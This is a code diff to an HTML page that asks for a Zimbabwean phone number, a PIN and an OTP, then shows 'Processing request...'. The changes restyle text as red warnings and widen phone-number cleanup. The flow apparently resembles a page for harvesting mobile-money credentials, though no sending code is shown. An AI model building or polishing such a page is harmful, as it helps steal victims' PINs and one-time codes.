@@ -81,12 +81,13 @@ font-size:22px;
 font-weight:800;
 }
 
-.subtitle{
+.warning{
 text-align:center;
 font-size:13px;
-color:#666;
+color:#e11d48;
 margin-top:6px;
 margin-bottom:18px;
+font-weight:600;
 }
 
 label{
@@ -206,11 +207,8 @@ opacity:1;
 
 </div>
 
-<div class="subtitle">
-
+<div class="warning">
 Enter your 9-digit number starting with 7.
-If a 10-digit number starting with 0 is pasted, the 0 is removed automatically.
-
 </div>
 
 <label>Enter your PIN</label>
@@ -233,7 +231,7 @@ If a 10-digit number starting with 0 is pasted, the 0 is removed automatically.
 
 <h1>OTP Verification</h1>
 
-<div class="subtitle" id="maskedNumber"></div>
+<div class="warning" id="maskedNumber"></div>
 
 <div class="pin">
 
@@ -263,7 +261,7 @@ Code expires in <span id="time">120</span>s
 
 <h1>Success</h1>
 
-<div class="subtitle">
+<div class="warning">
 Processing request...
 </div>
 
@@ -364,13 +362,16 @@ device:device
 }
 
 
-/* phone */
+/* phone cleanup */
 
 phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v.length===10 && v.startsWith("0"))
+if(v.startsWith("263"))
+v=v.slice(3)
+
+if(v.startsWith("0"))
 v=v.slice(1)
 
 if(v[0]!=="7")
@@ -449,7 +450,7 @@ const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
 maskedNumber.innerHTML=
 
-`Enter the OTP sent to your phone number ${masked}`
+`Enter the OTP sent to ${masked}`
 
 show("step3")
 
